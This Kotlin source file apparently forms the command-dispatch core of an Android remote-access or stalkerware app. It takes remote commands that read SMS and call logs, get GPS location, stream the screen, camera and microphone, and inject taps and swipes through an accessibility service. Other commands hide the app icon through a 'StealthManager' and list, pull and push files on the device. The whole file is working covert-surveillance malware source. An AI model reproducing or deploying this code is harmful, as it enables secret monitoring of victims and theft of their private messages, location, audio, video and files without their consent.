package com.example.admin

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.util.Base64
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.NetworkInterface

object CommandHandler {
    suspend fun dispatch(ctx: Context, cmd: String, args: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        try {
            when (cmd) {
                "get_device_info" -> deviceInfo(ctx)
                "get_sms" -> getSms(ctx, args.optInt("limit", 50))
                "get_calllogs" -> getCallLogs(ctx, args.optInt("limit", 50))
                "get_location" -> getLocation(ctx)
                "start_screen" -> startScreen(ctx)
                "stop_screen" -> stopScreen(ctx)
                "start_camera" -> startCameraStream(ctx, args.optString("facing", "back"))
                "stop_camera" -> stopCameraStream(ctx)
                "start_audio" -> startAudio(ctx)
                "stop_audio" -> stopAudio(ctx)
                "tap" -> tap(args.optDouble("x", 0.0).toFloat(), args.optDouble("y", 0.0).toFloat())
                "swipe" -> swipe(args.optDouble("x1", 0.0).toFloat(), args.optDouble("y1", 0.0).toFloat(), args.optDouble("x2", 0.0).toFloat(), args.optDouble("y2", 0.0).toFloat(), args.optLong("duration", 300L))
                "hide_icon" -> { StealthManager.hide(ctx); ok() }
                "unhide_icon" -> { StealthManager.unhide(ctx); ok() }
                "list_dir" -> listDir(args.optString("path", "/sdcard"))
                "download_file" -> downloadFile(args.optString("path", ""))
                "upload_file" -> uploadFile(args.optString("path", ""), args.optString("data", ""))
                else -> fail("unknown cmd: $cmd")
            }
        } catch (e: Exception) { fail(e.message ?: e.javaClass.simpleName) }
    }

    private fun ok(data: Any? = null) = JSONObject().put("ok", true).apply { if (data != null) put("data", data) }
    private fun fail(msg: String) = JSONObject().put("ok", false).put("error", msg)

    private fun deviceInfo(ctx: Context): JSONObject {
        val battery = ctx.getSystemService(Context.BATTERY_SERVICE).let { (it as android.os.BatteryManager).getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) }
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
        val dm = ctx.resources.displayMetrics
        return ok(JSONObject()
            .put("model", Build.MODEL)
            .put("android", Build.VERSION.RELEASE)
            .put("battery", "$battery%")
            .put("screen_w", dm.widthPixels)
            .put("screen_h", dm.heightPixels)
            .put("sim_operator", try { tm.networkOperatorName } catch (_: Exception) { "" })
            .put("ip", try { firstIpv4() } catch (_: Exception) { "unavailable" }))
    }

    private fun firstIpv4(): String {
        val ifaces = NetworkInterface.getNetworkInterfaces() ?: return "unavailable"
        for (nif in ifaces) {
            if (nif.isLoopback) continue
            for (addr in nif.inetAddresses) {
                val h = addr.hostAddress ?: continue
                if (h.matches(Regex("""\d+\.\d+\.\d+\.\d+"""))) return h
            }
        }
        return "unavailable"
    }

    private fun getSms(ctx: Context, limit: Int): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return fail("Permission missing")
        val out = JSONArray()
        ctx.contentResolver.query(Uri.parse("content://sms"), arrayOf("_id", "address", "body", "date"), null, null, "date DESC LIMIT $limit")?.use {
            while (it.moveToNext()) out.put(JSONObject().put("from", it.getString(1)).put("body", it.getString(2)).put("date", it.getLong(3)))
        }
        return ok(out)
    }

    private fun getCallLogs(ctx: Context, limit: Int): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return fail("Permission missing")
        val out = JSONArray()
        ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE), null, null, "${CallLog.Calls.DATE} DESC LIMIT $limit")?.use {
            while (it.moveToNext()) out.put(JSONObject().put("number", it.getString(0)).put("duration", it.getLong(1)).put("date", it.getLong(2)))
        }
        return ok(out)
    }

    private fun getLocation(ctx: Context): JSONObject {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return fail("Permission missing")
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) ?: return fail("No fix")
        return ok(JSONObject().put("lat", l.latitude).put("lon", l.longitude).put("acc", l.accuracy))
    }

    private fun startCameraStream(ctx: Context, facing: String): JSONObject {
        try {
            val i = Intent(ctx, CameraStreamService::class.java).apply { putExtra(CameraStreamService.EXTRA_FACING, facing) }
            ContextCompat.startForegroundService(ctx, i)
            return ok()
        } catch (e: Exception) { return fail("Failed to start camera: ${e.message}") }
    }

    private fun stopCameraStream(ctx: Context): JSONObject {
        try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
    }

    private fun startAudio(ctx: Context): JSONObject { 
        try { ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java)); return ok() } catch (e: Exception) { return fail("Failed to start audio: ${e.message}") }
    }
    private fun stopAudio(ctx: Context): JSONObject { 
        try { ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP }); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
    }

    private fun startScreen(ctx: Context): JSONObject {
        try {
            val data = ConnectionService.screenData ?: return fail("Grant Screen Capture in app first")
            ContextCompat.startForegroundService(ctx, Intent(ctx, ScreenCaptureService::class.java).apply {
                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, ConnectionService.screenResultCode)
                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
            })
            return ok()
        } catch (e: Exception) { return fail("Failed to start screen: ${e.message}") }
    }
    private fun stopScreen(ctx: Context): JSONObject { 
        try { ctx.stopService(Intent(ctx, ScreenCaptureService::class.java)); return ok() } catch (e: Exception) { return fail(e.message ?: "Error") }
    }

    private fun tap(x: Float, y: Float): JSONObject = if (TouchService.instance?.tap(x, y) == true) ok() else fail("Accessibility disabled")
    private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, ms: Long): JSONObject = if (TouchService.instance?.swipe(x1, y1, x2, y2, ms) == true) ok() else fail("Accessibility disabled")

    private fun listDir(path: String): JSONObject {
        val dir = File(path)
        if (!dir.exists()) return fail("Not found")
        if (!dir.isDirectory) return fail("Not a directory")
        val arr = JSONArray()
        dir.listFiles()?.sortedBy { it.name }?.take(200)?.forEach {
            arr.put(JSONObject().put("name", it.name).put("path", it.absolutePath).put("dir", it.isDirectory).put("size", if (it.isFile) it.length() else 0L))
        }
        return ok(JSONObject().put("path", dir.absolutePath).put("entries", arr))
    }

    private fun downloadFile(path: String): JSONObject {
        val f = File(path)
        if (!f.exists() || !f.isFile) return fail("Not a file")
        if (f.length() > 50L * 1024 * 1024) return fail("File too large > 50MB")
        return ok(JSONObject().put("b64", Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)))
    }

    private fun uploadFile(path: String, b64: String): JSONObject {
        if (b64.isEmpty()) return fail("Empty")
        val bytes = Base64.decode(b64, Base64.DEFAULT)
        val f = File(path)
        f.parentFile?.mkdirs()
        f.writeBytes(bytes)
        return ok(JSONObject().put("path", f.absolutePath))
    }
}
